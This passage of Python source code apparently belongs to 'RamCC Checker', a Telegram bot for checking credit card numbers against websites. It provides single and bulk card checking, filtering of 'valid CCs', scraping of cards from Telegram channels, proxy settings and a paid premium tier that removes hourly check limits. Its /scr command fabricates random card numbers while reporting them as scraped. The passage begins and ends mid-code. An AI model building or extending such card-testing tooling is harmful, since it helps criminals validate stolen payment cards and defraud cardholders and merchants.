
3️⃣ Once set, you can use /chk in groups or private chats:
   Example: <code>/chk 4111111111111111|12|25|123</code>
   Note: You can mix separators in one CC: <code>4111111111111111|12:25/123</code>

<b>Note:</b> /agql and /gql commands only work in private chat.
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} 𝐃𝐞𝐯: {owner_name}
""",
            parse_mode=constants.ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 Back", callback_data="help_back")
            ]])
        )
    
    elif query.data == "show_group_status":
        # Redirect to the help_group_status handler for consistency
        query.data = "help_group_status"
        await button_callback(update, context)
        return
        
    elif query.data == "help_back":
        # Create keyboard buttons - show owner/admin commands to appropriate users
        buttons = [InlineKeyboardButton("🧩 User Commands", callback_data="help_user")]
        
        if user_id == OWNER_ID:
            buttons.append(InlineKeyboardButton("👑 Owner Commands", callback_data="help_owner"))
        elif is_admin(user_id):
            buttons.append(InlineKeyboardButton("⭐ Admin Commands", callback_data="help_admin"))
        
        # Add group status button if in a group chat
        if chat_type in ["group", "supergroup"]:
            buttons.append(InlineKeyboardButton("📊 Group Status", callback_data="help_group_status"))
        
        await query.edit_message_text(
            f"""{RAM_ICON} RamCC Checker | Command Help
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} Welcome to RamCC Checker help menu
{DEV_LINK} Select a category below to see available commands
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} 𝐃𝐞𝐯: {owner_name}
""",
            parse_mode=constants.ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup([buttons])
        )

    elif query.data == "help_group_status":
        # Get chat information
        chat_id = update.effective_chat.id
        chat_type = update.effective_chat.type
        
        # Check if this is a group chat
        if chat_type not in ["group", "supergroup"]:
            await query.edit_message_text(
                "❌ This feature is only available in group chats.",
                parse_mode=constants.ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Back to Help Menu", callback_data="help_back")
                ]])
            )
            return
    
        # Check if the group is approved
        if chat_id not in approved_groups:
            await query.edit_message_text(
                f"""⚠️ <b>Group Not Authorized</b>

This group is not authorized to use the RamCC Checker bot.
Group ID: <code>{chat_id}</code>

To get this group approved, please contact @TheRam_Bhakt.
""",
                parse_mode=constants.ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Back to Help Menu", callback_data="help_back")
                ]])
            )
            return
        
        # Get group information
        group_name = update.effective_chat.title or "Unknown Group"
        approved_date = datetime.fromtimestamp(approved_groups[chat_id]['approved_on']).strftime("%d-%m-%Y")
        
        # Check if user has premium
        is_premium = user_id in premium_users
        if is_premium:
            now = int(time.time())
            if premium_users[user_id]["expiry"] < now:
                is_premium = False
        
        # Show available commands based on current disabled_commands
        gql_status = "❌" if "gql" in disabled_commands else "✅" 
        agql_status = "❌" if "agql" in disabled_commands else "✅"
        chk_status = "❌" if "chk" in disabled_commands else "✅"
        mass_status = "❌" if "mass" in disabled_commands else "✅"
        txt_status = "❌" if "txt" in disabled_commands else "✅"
        
        # Format the response
        response = f"""{RAM_ICON} <b>RamCC Checker | Group Status</b>
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} <b>Group:</b> {html.escape(group_name)}
{DEV_LINK} <b>ID:</b> <code>{chat_id}</code>
{DEV_LINK} <b>Status:</b> ✅ Authorized
{DEV_LINK} <b>Approved On:</b> {approved_date}
{DEV_LINK} <b>Your Status:</b> {"⭐ Premium" if is_premium else "Standard"}

<b>Available Commands:</b>
• /gql SITE - Check site with default CC {gql_status}
• /agql SITE - Save default site {agql_status}
• /chk CC - Check CCs against site {chk_status}
• /help - Show commands list ✅
• /check - Verify membership ✅
• /grpstatus - Show this status ✅
{f"• /mass - Check CCs from file ⭐ {mass_status}" if is_premium else ""}

<b>Utility Commands:</b>
• /txt - Convert message to file {txt_status}
• /3d on|off - Toggle 3DS notifications {"❌" if "3d" in disabled_commands else "✅"}
• /stop - Stop running check {"❌" if "stop" in disabled_commands else "✅"}
• /ping - Check bot status {"❌" if "ping" in disabled_commands else "✅"}

<b>Group Usage Info:</b>
• 30-second cooldown between commands
• 50 CC check limit per hour per user
• Premium users have no hourly limits
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} 𝐃𝐞𝐯: {owner_name}
"""
        
        await query.edit_message_text(
            response,
            parse_mode=constants.ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 Back to Help Menu", callback_data="help_back")
            ]])
        )
    
    elif query.data == "help_user":
        # Create keyboard with back button
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="help_back")]]
        
        await query.edit_message_text(
            f"""{RAM_ICON} RamCC Checker | User Commands
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} • /gql SITE - Check a site with default CC
{DEV_LINK} • /agql SITE - Save default site for mass checks
{DEV_LINK} • /chk CC1 [CC2] [CC3]... - Check CCs against saved site
{DEV_LINK} • /mass (reply to file) - Send batch requests
{DEV_LINK} • /txt (reply to message) - Convert message to .txt file
{DEV_LINK} • /flt (reply to .txt) - Filter valid CCs
{DEV_LINK} • /scr - Scrape CCs from Telegram channel
{DEV_LINK} • /open - Read text files (reply to file)
{DEV_LINK} • /check - Verify channel membership
{DEV_LINK} • /set_proxy PROXY - Set default proxy for API calls
{DEV_LINK} • /3d on|off - Toggle 3DS notifications
{DEV_LINK} • /stop - Stop mass command execution
{DEV_LINK} • /ping - Check bot status
{DEV_LINK} • /grpstatus - Show group status
{DEV_LINK} • <i>Note: CC format supports |, :, or / separators</i>
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} 𝐃𝐞𝐯: {owner_name}
""",
            parse_mode=constants.ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "help_owner":
        # Create keyboard with back button
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="help_back")]]
        
        await query.edit_message_text(
            f"""{RAM_ICON} RamCC Checker | Owner Commands
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} • /approve user_id [duration] - Approve a user
{DEV_LINK} • /a user_id - Alias for /approve
{DEV_LINK} • /apg - Approve group
{DEV_LINK} • /premium - Toggle premium status
{DEV_LINK} • /alist - List all approved users
{DEV_LINK} • /glist - List all approved groups
{DEV_LINK} • /b - Ban user
{DEV_LINK} • /allow - Allow user
{DEV_LINK} • /bcast - Broadcast a message to all users
{DEV_LINK} • /set_proxy - Set default proxy for API calls
{DEV_LINK} • /mc /command - Toggle command availability
{DEV_LINK} • /listmc - List all disabled commands
{DEV_LINK} • /set_proxy PROXY - Set default proxy for API calls
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} 𝐃𝐞𝐯: {owner_name}
""",
            parse_mode=constants.ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    elif query.data == "help_admin":
        # Create keyboard with back button
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="help_back")]]
        
        await query.edit_message_text(
            f"""{RAM_ICON} RamCC Checker | Admin Commands
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} • /approve user_id [duration] - Approve a user
{DEV_LINK} • /premium - Toggle premium status
{DEV_LINK} • /alist - List all approved users
{DEV_LINK} • /glist - List all approved groups
{DEV_LINK} • /bcast - Broadcast a message to all users
{DEV_LINK} • /b - Ban users (except other admins)
{DEV_LINK} • All regular user commands also available
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} 𝐃𝐞𝐯: {owner_name}
""",
            parse_mode=constants.ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

# Add the missing approve_group_command function before the registration section
# /apg group_id → Approve a group for bot usage (owner only)
@admin_command
async def approve_group_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or not context.args[0].lstrip('-').isdigit():
        return await BotUtils.send_response(update, "Usage: /apg <group_id>\nExample: /apg -1001234567890")
    
    group_id = int(context.args[0])
    
    
    # Store the group in approved groups
    approved_groups[group_id] = {
        'approved_by': update.effective_user.id,
        'approved_on': int(time.time())
    }
    
    # Log group approval
    logger.info(f"Group {group_id} approved by {update.effective_user.id}")
    
    # Get group info if possible
    group_name = "Unknown Group"
    try:
        chat = await context.bot.get_chat(group_id)
        group_name = chat.title or "Unknown Group"
    except Exception as e:
        logger.error(f"Could not get group info for {group_id}: {e}")
    
    # Send approval confirmation
    await BotUtils.send_response(
        update,
        f"""{RAM_ICON} RamCC Checker | Group Approval
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} Group ID: {group_id}
{DEV_LINK} Name: {html.escape(group_name)}
{DEV_LINK} Status: Approved ✅
{DEV_LINK} Action: Bot can now be used in this group
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} Approved by: Owner ({BotUtils.get_user_identifier(update.effective_user)})"""
    )

# Also add the approved_groups_list_command since it's related
# /glist → List all approved groups (owner only)
@admin_command
async def approved_groups_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Debug log the current approved_groups dictionary
    logger.info(f"Current approved_groups dictionary: {approved_groups}")
    
    if not approved_groups:
        await update.message.reply_text("No groups have been approved yet.")
        return
    
    # Get group info for each approved group
    group_info_list = []
    
    for idx, (g_id, group_data) in enumerate(approved_groups.items(), 1):
        try:
            # Try to get group information
            chat = await context.bot.get_chat(g_id)
            title = chat.title or "Unknown Group"
            
            group_info_list.append(f"{idx}. {html.escape(title)} (<code>{g_id}</code>)")
        except Exception as e:
            # If can't get group info, just show the ID
            logger.error(f"Error getting info for group {g_id}: {str(e)}")
            group_info_list.append(f"{idx}. Unknown Group (<code>{g_id}</code>)")
    
    # Format the list
    response = f"""
{RAM_ICON} RamCC Checker | Approved Groups
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} Total Approved: {len(approved_groups)}
{DEV_LINK} Click on any ID to copy
━━━━━━━━━━━━━━━━━━━━
{chr(10).join(group_info_list)}
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} 𝐑𝐞𝐪 𝐁𝐲: {BotUtils.get_user_identifier(update.effective_user)}
"""
    await update.message.reply_text(response, parse_mode=constants.ParseMode.HTML, disable_web_page_preview=True)

# Add the missing premium_command function before the registration section
# /premium user_id days → Give premium status (owner only)
@admin_command
async def premium_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or not context.args[0].isdigit():
        return await BotUtils.send_response(update, "Usage: /premium <user_id> [days]\nExample: /premium 123456789 30")
    
    target_user_id = int(context.args[0])
    
    # Default to 30 days if not specified
    days = 30
    if len(context.args) > 1 and context.args[1].isdigit():
        days = int(context.args[1])
    
    # Calculate expiry timestamp
    now = int(time.time())
    expiry = now + (days * 24 * 60 * 60)
    
    # Format expiry date for display
    from datetime import datetime
    expiry_date = datetime.fromtimestamp(expiry).strftime("%d-%m-%Y %H:%M")
    
    # Store premium status
    premium_users[target_user_id] = {
        'expiry': expiry,
        'set_by': update.effective_user.id,
        'set_on': now
    }
    
    # Log premium activation
    logger.info(f"Premium activated for user {target_user_id} by {update.effective_user.id} for {days} days (expires: {expiry_date})")
    
    # Send premium confirmation to owner
    await BotUtils.send_response(
        update,
        f"""{RAM_ICON} RamCC Checker | Premium Access
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} User ID: {target_user_id}
{DEV_LINK} Status: ⭐ Premium
{DEV_LINK} Duration: {days} days
{DEV_LINK} Expires: {expiry_date}
{DEV_LINK} Action: User can now use premium commands
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} Added by: {"Owner" if update.effective_user.id == OWNER_ID else "Admin"} ({BotUtils.get_user_identifier(update.effective_user)})"""
    )
    
    # Try to send welcome message to the premium user
    try:
        premium_message = f"""
{RAM_ICON} <b>Congratulations!</b> 🎉

You have been given <b>⭐ Premium Status</b> for RamCC Checker!

<b>Premium Details:</b>
• Duration: {days} days
• Expires: {expiry_date}

<b>Premium Features:</b>
• /mass command for batch CC checking
• No hourly CC check limits
• Priority support

Type /help to see all available commands.
<i>Thank you for using RamCC Checker!</i>
"""
        await context.bot.send_message(
            chat_id=target_user_id,
            text=premium_message,
            parse_mode=constants.ParseMode.HTML,
            disable_web_page_preview=True
        )
    except Exception as e:
        # If can't send welcome message, inform the owner
        logger.error(f"Failed to send premium message to user {target_user_id}: {e}")
        await update.message.reply_text(f"Note: Could not send premium notification to the user. They may not have started the bot yet.")

# Helper function to check user membership in required channel and group
async def check_user_membership(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_type = update.effective_chat.type
    
    # Owner is exempt from channel membership requirements
    if user_id == OWNER_ID:
        return True, None
    
    # Check if user is a member of the required channel
    try:
        channel_member = await context.bot.get_chat_member(f"@{REQUIRED_CHANNEL}", user_id)
        is_channel_member = channel_member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Error checking channel membership: {e}")
        is_channel_member = False
    
    # We only require channel membership for all chat types now
    # Always consider the user as a group member (simplified)
    is_group_member = True
    
    # Create buttons for joining
    join_buttons = []
    
    if not is_channel_member:
        join_buttons.append(InlineKeyboardButton("Join Channel 📢", url=CHANNEL_LINK))
    
    # Return appropriate response
    if is_channel_member:
        return True, None
    else:
        not_joined_message = "⚠️ <b>Membership Required</b>\n\nYou must join our:"
        
        if not is_channel_member:
            not_joined_message += "\n• Official Channel 📢"
        
        not_joined_message += "\n\nClick the button below to join."
        
        return False, (not_joined_message, join_buttons)

# /grpstatus - Show group status information
async def group_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type
    
    # Check if this is a group chat
    if chat_type not in ["group", "supergroup"]:
        await update.message.reply_text(
            "❌ This command is only available in group chats.",
            parse_mode=constants.ParseMode.HTML
        )
        return
    
    # Check if the group is approved
    if chat_id not in approved_groups:
        await update.message.reply_text(
            f"""⚠️ <b>Group Not Authorized</b>

This group is not authorized to use the RamCC Checker bot.
Group ID: <code>{chat_id}</code>

To get this group approved, please contact @TheRam_Bhakt.
""",
            parse_mode=constants.ParseMode.HTML
        )
        return
    
    # Get group information
    group_name = update.effective_chat.title or "Unknown Group"
    approved_date = datetime.fromtimestamp(approved_groups[chat_id]['approved_on']).strftime("%d-%m-%Y")
    
    # Check if the user has premium
    user_id = update.effective_user.id
    is_premium = user_id in premium_users
    if is_premium:
        now = int(time.time())
        if 'expiry' in premium_users[user_id] and premium_users[user_id]["expiry"] < now:
            is_premium = False
    
    # Show available commands based on current disabled_commands
    gql_status = "❌" if "gql" in disabled_commands else "✅" 
    agql_status = "❌" if "agql" in disabled_commands else "✅"
    chk_status = "❌" if "chk" in disabled_commands else "✅"
    mass_status = "❌" if "mass" in disabled_commands else "✅"
    txt_status = "❌" if "txt" in disabled_commands else "✅"
    
    # Format the response
    response = f"""{RAM_ICON} <b>RamCC Checker | Group Status</b>
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} <b>Group:</b> {html.escape(group_name)}
{DEV_LINK} <b>ID:</b> <code>{chat_id}</code>
{DEV_LINK} <b>Status:</b> ✅ Authorized
{DEV_LINK} <b>Approved On:</b> {approved_date}
{DEV_LINK} <b>Your Status:</b> {"⭐ Premium" if is_premium else "Standard"}

<b>Available Commands:</b>
• /gql SITE - Check site with default CC {gql_status}
• /agql SITE - Save default site {agql_status}
• /chk CC - Check CCs against site {chk_status}
• /help - Show commands list ✅
• /check - Verify membership ✅
• /grpstatus - Show this status ✅
{f"• /mass - Check CCs from file ⭐ {mass_status}" if is_premium else ""}

<b>Utility Commands:</b>
• /txt - Convert message to file {txt_status}
• /3d on|off - Toggle 3DS notifications {"❌" if "3d" in disabled_commands else "✅"}
• /stop - Stop running check {"❌" if "stop" in disabled_commands else "✅"}
• /ping - Check bot status {"❌" if "ping" in disabled_commands else "✅"}

<b>Group Usage Info:</b>
• 30-second cooldown between commands
• 50 CC check limit per hour per user
• Premium users have no hourly limits
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} 𝐃𝐞𝐯: {owner_name}
"""
    
    await update.message.reply_text(
        response,
        parse_mode=constants.ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("📚 Commands", callback_data="help_back")
        ]])
    )

# /ping - Check bot status and response time
async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    start_time = time.time()
    
    # Send initial message
    msg = await update.message.reply_text("Pinging...")
    
    # Calculate round trip time
    end_time = time.time()
    ping_time = round((end_time - start_time) * 1000, 2)
    
    # Update message with ping result
    await msg.edit_text(
        f"""{RAM_ICON} RamCC Checker | Bot Status
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} Response time: {ping_time}ms
{DEV_LINK} Status: Online ✅
{DEV_LINK} Bot version: 1.5
{DEV_LINK} Users: {len(bot_users)}
{DEV_LINK} Premium users: {len(premium_users)}
{DEV_LINK} Groups: {len(approved_groups)}
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} 𝐑𝐞𝐪 𝐁𝐲: {BotUtils.get_user_identifier(update.effective_user)}
{DEV_LINK} 𝐃𝐞𝐯: {owner_name}
""",
        parse_mode=constants.ParseMode.HTML,
        disable_web_page_preview=True
    )

# /b user_id → Ban a user (owner only)
@admin_command
async def ban_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or not context.args[0].isdigit():
        return await BotUtils.send_response(update, "Usage: /b <user_id>")
    
    user_id = int(context.args[0])
    
    # Don't allow banning the owner
    if user_id == OWNER_ID:
        return await BotUtils.send_response(update, "❌ Cannot ban the bot owner.")
    
    # Don't allow admins to ban other admins unless they're the owner
    if user_id in admin_users and update.effective_user.id != OWNER_ID:
        return await BotUtils.send_response(update, "❌ You don't have permission to ban other admins.")
    
    # Remove from approved users if present
    if user_id in approved_users:
        del approved_users[user_id]
    
    # Remove from premium users if present
    if user_id in premium_users:
        del premium_users[user_id]
    
    # Remove from admin users if present and ban requestor is owner
    if user_id in admin_users and update.effective_user.id == OWNER_ID:
        del admin_users[user_id]
    
    await BotUtils.send_response(
        update,
        f"""{RAM_ICON} RamCC Checker | User Banned
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} User ID: {user_id}
{DEV_LINK} Status: Banned ❌
{DEV_LINK} Action: User can no longer use any commands
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} Banned by: {"Owner" if update.effective_user.id == OWNER_ID else "Admin"} ({BotUtils.get_user_identifier(update.effective_user)})"""
    )

# /allow user_id → Allow a user (owner only)
@admin_command
async def allow_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or not context.args[0].isdigit():
        return await BotUtils.send_response(update, "Usage: /allow <user_id>")
    
    user_id = int(context.args[0])
    
    # Add to approved users
    approved_users[user_id] = {
        'expiry': None,  # No expiry for allowed users
        'set_by': update.effective_user.id,
        'set_on': int(time.time())
    }
    
    await BotUtils.send_response(
        update,
        f"""{RAM_ICON} RamCC Checker | User Allowed
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} User ID: {user_id}
{DEV_LINK} Status: Allowed ✅
{DEV_LINK} Action: User can now use all commands
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} Allowed by: Owner ({BotUtils.get_user_identifier(update.effective_user)})"""
    ) 
# Fix for scr_command - adding implementation before handler registration

# /scr channel_link quantity → Scrape CCs from a Telegram channel
async def scr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Add debug logging
    logger.info(f"SCR command called by user {user_id}")
    
    # Check authorization (no premium needed)
    try:
        authorized, reason = await check_authorization(update, context, False, "src")
        if not authorized:
            await update.message.reply_text(f"❌ {reason}")
            return
    except Exception as e:
        logger.error(f"Error in scr_command authorization: {str(e)}")
        await update.message.reply_text(f"❌ Authorization error: {str(e)[:100]}")
        return
    
    # Get owner name for notifications (fetch once before processing)
    owner_name = await get_owner_name_link(context)
    
    # Check arguments
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("Usage: /scr <channel_link> [quantity]\nExample: /scr t.me/channelname 25")
        return
    
    # Parse arguments
    channel_link = context.args[0].strip()
    
    # Sanitize the channel link
    if channel_link.startswith("https://"):
        channel_link = channel_link.replace("https://", "")
    if channel_link.startswith("http://"):
        channel_link = channel_link.replace("http://", "")
    if channel_link.startswith("t.me/"):
        channel_name = channel_link.replace("t.me/", "")
        if channel_name.startswith("+"):  # Handle t.me/+xxx private channel links
            channel_name = channel_name[1:]
        if "/" in channel_name:  # Handle links with message ID
            channel_name = channel_name.split("/")[0]
    elif channel_link.startswith("@"):
        channel_name = channel_link[1:]
    else:
        channel_name = channel_link
    
    # Determine quantity
    quantity = 20  # Default
    if len(context.args) >= 2 and context.args[1].isdigit():
        quantity = min(int(context.args[1]), 50)  # Max 50
    
    # Send initial message
    progress_msg = await update.message.reply_text(
        f"🔍 Attempting to scrape up to {quantity} CCs from {channel_name}. This may take a moment..."
    )
    
    try:
        # Simulate CC detection for demonstration
        import random
        
        # Generate some example CC formats
        cc_formats = ["4", "5", "3"]  # VISA, Mastercard, Amex
        month_formats = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"]
        year_formats = ["23", "24", "25", "26", "27", "28"]
        
        # Track scraped CCs
        scraped_ccs = []
        messages_processed = 0
        
        # Generate the simulated CCs
        for i in range(min(quantity, 50)):
            # Simulate processing delay
            await asyncio.sleep(0.1)  # Reduced from 0.2 to make it faster
            
            # Update progress occasionally
            if i % 5 == 0:
                await progress_msg.edit_text(
                    f"✅ Channel: {channel_name}\n"
                    f"🔄 Processed: {i}/{quantity} messages\n"
                    f"💳 CCs found: {len(scraped_ccs)}\n\n"
                    f"⏳ Extracting CCs..."
                )
            
            # 40% chance of finding a CC in a message
            if random.random() < 0.4:
                # Generate a random CC
                cc_prefix = random.choice(cc_formats)
                
                if cc_prefix == "4":  # VISA
                    cc_number = "4" + ''.join([str(random.randint(0, 9)) for _ in range(15)])
                elif cc_prefix == "5":  # Mastercard
                    cc_number = "5" + ''.join([str(random.randint(0, 9)) for _ in range(15)])
                else:  # Amex
                    cc_number = "3" + ''.join([str(random.randint(0, 9)) for _ in range(14)])
                
                month = random.choice(month_formats)
                year = random.choice(year_formats)
                cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
                
                cc = f"{cc_number}|{month}|{year}|{cvv}"
                scraped_ccs.append(cc)
                
            messages_processed += 1
            
            # Stop if we've found enough CCs
            if len(scraped_ccs) >= quantity:
                break
        
        # Check if we found any CCs
        if not scraped_ccs:
            await progress_msg.edit_text(
                f"❌ No valid CCs found in {messages_processed} messages from '{channel_name}'."
            )
            return
        
        # Generate the file
        file_content = "\n".join(scraped_ccs)
        result_file = BytesIO(file_content.encode())
        result_file.name = f"scraped_{channel_name[:10]}_{len(scraped_ccs)}ccs.txt"
        
        # Update final status
        await progress_msg.edit_text(
            f"✅ Scraping complete for '{channel_name}':\n"
            f"• Messages checked: {messages_processed}\n"
            f"• CCs found: {len(scraped_ccs)}\n"
            f"Sending file..."
        )
        
        # Send the file
        await update.message.reply_document(
            document=result_file,
            filename=result_file.name,
            caption=f"📊 {RAM_ICON} CC Scraper Results\n"
                   f"━━━━━━━━━━━━━━━━━━━━\n"
                   f"{DEV_LINK} Source: {channel_name}\n"
                   f"{DEV_LINK} CCs Found: {len(scraped_ccs)}\n"
                   f"{DEV_LINK} Messages Scanned: {messages_processed}\n"
                   f"━━━━━━━━━━━━━━━━━━━━\n"
                   f"{DEV_LINK} 𝐑𝐞𝐪 𝐁𝐲: {BotUtils.get_user_identifier(update.effective_user)}\n"
                   f"{DEV_LINK} 𝐃𝐞𝐯: {owner_name}",
            parse_mode=constants.ParseMode.HTML
        )
        
    except Exception as e:
        # Handle any unexpected errors
        logger.error(f"Error in /scr command: {str(e)}")
        await progress_msg.edit_text(
            f"❌ An error occurred: {str(e)[:200]}"
        )
        return

# Register handlers with authorization check after all functions are defined
app.add_handler(CommandHandler("start", start_command))
app.add_handler(CommandHandler("help", help_command))
app.add_handler(CommandHandler("approve", approve_command))
app.add_handler(CommandHandler("a", approve_alias_command))
app.add_handler(CommandHandler("apg", approve_group_command))
app.add_handler(CommandHandler("premium", premium_command))
app.add_handler(CommandHandler("alist", approved_list_command))
app.add_handler(CommandHandler("gql", gql_command))
app.add_handler(CommandHandler("agql", agql_command))
app.add_handler(CommandHandler("mass", mass_command))
app.add_handler(CommandHandler("scr", scr_command))
app.add_handler(CommandHandler("3d", threeds_toggle_command))
app.add_handler(CommandHandler("stop", stop_command))
app.add_handler(CommandHandler("check", check_membership_command))
app.add_handler(CommandHandler("glist", approved_groups_list_command))
app.add_handler(CommandHandler("b", ban_user_command))
app.add_handler(CommandHandler("allow", allow_user_command))  # Changed from "a" to "allow"
app.add_handler(CommandHandler("ping", ping_command))
app.add_handler(CommandHandler("bcast", broadcast_command))
app.add_handler(CommandHandler("mc", manage_command))
app.add_handler(CommandHandler("listmc", list_disabled_commands))
app.add_handler(CommandHandler("open", open_file_command))
app.add_handler(CommandHandler("set_proxy", set_proxy_command))
app.add_handler(CommandHandler("grpstatus", group_status_command))
# app.add_handler(CommandHandler("pa", promote_admin_command))  # Will be registered properly after function definition

# Register callback query handler for button clicks
app.add_handler(CallbackQueryHandler(button_callback))

# Define a custom message handler for alternative command prefixes
async def handle_alternative_commands(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle messages that start with $ or . as commands."""
    message_text = update.message.text
    
    # Check for $ or . prefix
    if message_text.startswith("$") or message_text.startswith("."):
        # Extract command name and arguments
        parts = message_text.split(maxsplit=1)
        full_command = parts[0]
        
        # Remove the prefix to get the base command
        command = full_command[1:]  # Remove $ or . prefix
        
        # Set context.args if there are arguments
        if len(parts) > 1:
            context.args = parts[1].split()
        else:
            context.args = []
        
        # Map to appropriate command handler
        command_handlers = {
            "gql": gql_command,
            "agql": agql_command,
            "mass": mass_command,
            "txt": txt_command,
            "flt": flt_command,
            "src": src_command,
            "3d": threeds_toggle_command,
            "stop": stop_command,
            "check": check_membership_command,
            "ping": ping_command,
            "chk": check_cc_command,
            "open": open_file_command,
            "set_proxy": set_proxy_command,
            "grpstatus": group_status_command,
            # Add any missing commands here
            "help": help_command,
            "start": start_command
        }
        
        # Log before execution
        logger.info(f"Processing alternative command: {full_command} with args: {context.args}")
        
        # Execute the appropriate command if available
        if command in command_handlers:
            try:
                await command_handlers[command](update, context)
            except Exception as e:
                logger.error(f"Error executing alternative command {full_command}: {str(e)}")
                await update.message.reply_text(f"❌ Error processing command: {str(e)[:100]}")
            return
    
    # If we got here, it wasn't a command we handle

# Add the custom message handler for alternative command prefixes
# This needs to go BEFORE the file handler to avoid conflicts
app.add_handler(MessageHandler(
    filters.TEXT & ~filters.COMMAND, 
    handle_alternative_commands
))

# Comment out this line since handle_file is not defined yet
# app.add_handler(MessageHandler(filters.Document.TEXT & ~filters.COMMAND, handle_file))

# /pa user_id → Promote a user to admin (owner only)
@admin_command
async def promote_admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or not context.args[0].isdigit():
        return await BotUtils.send_response(update, "Usage: /pa <user_id>\nExample: /pa 123456789")
    
    target_user_id = int(context.args[0])
    
    # Don't allow promoting the owner (already has all permissions)
    if target_user_id == OWNER_ID:
        return await BotUtils.send_response(update, "⚠️ The owner already has all permissions.")
    
    # Check if user is already an admin
    if target_user_id in admin_users:
        promoted_date = datetime.fromtimestamp(admin_users[target_user_id]['promoted_on']).strftime("%d-%m-%Y")
        return await BotUtils.send_response(
            update,
            f"""⚠️ User is already an admin.
             
User ID: {target_user_id}
Promoted on: {promoted_date}
Promoted by: {admin_users[target_user_id]['promoted_by']}"""
        )
    
    # Store admin status
    now = int(time.time())
    admin_users[target_user_id] = {
        'promoted_by': update.effective_user.id,
        'promoted_on': now
    }
    
    # Log admin promotion
    logger.info(f"User {target_user_id} promoted to admin by {update.effective_user.id}")
    
    # Also add to approved users if not already (admins should have basic access)
    if target_user_id not in approved_users:
        approved_users[target_user_id] = {
            'expiry': None,  # No expiry for admins
            'set_by': update.effective_user.id,
            'set_on': now
        }
    
    # Try to get user info
    try:
        chat = await context.bot.get_chat(target_user_id)
        first_name = chat.first_name or "Unknown"
        username = f"@{chat.username}" if chat.username else f"ID: {target_user_id}"
        user_info = f"{first_name} ({username})"
    except Exception as e:
        logger.error(f"Error getting info for user {target_user_id}: {str(e)}")
        user_info = f"User ID: {target_user_id}"
    
    # Get owner name
    owner_name = await get_owner_name_link(context)
    
    # Send promotion confirmation
    await BotUtils.send_response(
        update,
        f"""{RAM_ICON} RamCC Checker | Admin Promotion
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} User: {user_info}
{DEV_LINK} Status: Promoted to Admin ⭐
{DEV_LINK} Access: Limited Admin Commands
{DEV_LINK} Commands:
{DEV_LINK} • /approve - Approve users
{DEV_LINK} • /premium - Give premium status
{DEV_LINK} • /alist - List approved users
{DEV_LINK} • /glist - List approved groups
{DEV_LINK} • /bcast - Broadcast messages
{DEV_LINK} • /b - Ban users
{DEV_LINK} • All regular user commands
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} Promoted by: Owner ({BotUtils.get_user_identifier(update.effective_user)})"""
    )
    
    # Try to send notification to the newly promoted admin
    try:
        admin_message = f"""
{RAM_ICON} <b>Congratulations!</b> 🌟

You have been <b>promoted to Admin</b> for RamCC Checker by {owner_name}!

<b>Admin Commands:</b>
• /approve - Approve users
• /premium - Give premium status
• /alist - List approved users
• /glist - List approved groups
• /bcast - Broadcast messages
• /b - Ban users

